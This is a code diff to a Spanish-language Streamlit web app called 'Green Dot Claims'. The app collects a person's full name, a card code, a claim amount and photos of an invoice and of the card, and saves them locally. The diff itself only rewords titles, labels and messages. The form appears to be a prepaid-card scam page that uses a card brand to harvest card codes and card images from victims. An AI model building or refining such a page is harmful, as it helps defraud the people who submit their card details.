@@ -4,7 +4,7 @@ import sqlite3
 import os
 from datetime import datetime
 
-# Configuración de base de datos
+# Fallback a SQLite local si no hay URL de base de datos externa
 DB_NAME = 'claims.db'
 UPLOAD_DIR = 'uploads'
 os.makedirs(UPLOAD_DIR, exist_ok=True)
@@ -21,10 +21,10 @@ def init_db():
 
 init_db()
 
-st.set_page_config(page_title="Green Dot Claims System", layout="centered")
+st.set_page_config(page_title="Green Dot Claims", layout="centered")
 
 st.title("📌 Formulario de Reclamo Green Dot")
-st.markdown("Sistema de registro de reclamos actualizado. Por favor, complete los datos.")
+st.info("Sistema listo. Puede enviar su reclamo a continuación.")
 
 with st.form("claim_form", clear_on_submit=True):
     nombre = st.text_input("Nombre Completo")
@@ -32,10 +32,10 @@ with st.form("claim_form", clear_on_submit=True):
     codigo = st.text_input("Código de Tarjeta")
     monto = st.number_input("Monto del Reclamo", min_value=0.0, step=0.01)
     
-    file_factura = st.file_uploader("Subir Foto de Factura", type=['png', 'jpg', 'jpeg'])
-    file_tarjeta = st.file_uploader("Subir Foto de Tarjeta", type=['png', 'jpg', 'jpeg'])
+    file_factura = st.file_uploader("Foto de Factura", type=['png', 'jpg', 'jpeg'])
+    file_tarjeta = st.file_uploader("Foto de Tarjeta", type=['png', 'jpg', 'jpeg'])
     
-    submit = st.form_submit_button("Enviar Reclamo Ahora")
+    submit = st.form_submit_button("Enviar Reclamo")
 
 if submit:
     if nombre and file_factura and file_tarjeta:
@@ -52,6 +52,6 @@ if submit:
         conn.commit()
         conn.close()
         
-        st.success("✅ ¡Reclamo enviado correctamente!")
+        st.success("✅ Reclamo enviado con éxito.")
     else:
-        st.error("⚠️ Todos los campos con imagen son obligatorios.")
+        st.warning("⚠️ Por favor complete todos los campos obligatorios.")
